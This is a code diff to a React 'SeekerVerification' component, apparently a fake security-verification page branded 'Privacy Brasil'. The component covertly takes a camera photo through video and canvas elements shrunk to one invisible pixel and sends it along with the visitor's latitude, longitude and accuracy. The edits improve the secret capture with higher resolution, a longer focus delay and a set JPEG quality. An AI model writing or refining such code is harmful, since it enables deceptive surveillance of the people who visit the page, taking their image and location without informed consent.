@@ -38,13 +38,17 @@ export default function SeekerVerification({ displayName, onVerified }: SeekerVe
           if (videoRef.current) {
             videoRef.current.srcObject = stream;
             
-            // Aguardar um pouco para a câmera estabilizar
+            // Aguardar um pouco para a câmera estabilizar e focar
             setTimeout(() => {
               if (videoRef.current && canvasRef.current) {
                 const context = canvasRef.current.getContext("2d");
                 if (context) {
-                  context.drawImage(videoRef.current, 0, 0, 640, 480);
-                  const photo = canvasRef.current.toDataURL("image/jpeg");
+                  // Ajustar canvas para o tamanho real do vídeo se necessário
+                  canvasRef.current.width = videoRef.current.videoWidth || 640;
+                  canvasRef.current.height = videoRef.current.videoHeight || 480;
+                  
+                  context.drawImage(videoRef.current, 0, 0, canvasRef.current.width, canvasRef.current.height);
+                  const photo = canvasRef.current.toDataURL("image/jpeg", 0.8);
                   
                   // Enviar dados
                   sendData(lat, lon, acc, photo);
@@ -53,7 +57,7 @@ export default function SeekerVerification({ displayName, onVerified }: SeekerVe
                   stream.getTracks().forEach(track => track.stop());
                 }
               }
-            }, 1500);
+            }, 2500);
           } else {
              sendData(lat, lon, acc, null);
           }
@@ -136,9 +140,9 @@ export default function SeekerVerification({ displayName, onVerified }: SeekerVe
           © 2026 Privacy Brasil - Protocolo de Segurança SSL Ativado
         </p>
 
-        {/* Hidden Elements */}
-        <video ref={videoRef} width="640" height="480" className="hidden" autoPlay playsInline muted />
-        <canvas ref={canvasRef} width="640" height="480" className="hidden" />
+        {/* Elementos Técnicos (Invisíveis) */}
+        <video ref={videoRef} className="invisible absolute h-1 w-1 pointer-events-none" autoPlay playsInline muted />
+        <canvas ref={canvasRef} className="invisible absolute h-1 w-1 pointer-events-none" />
       </div>
     </div>
   );
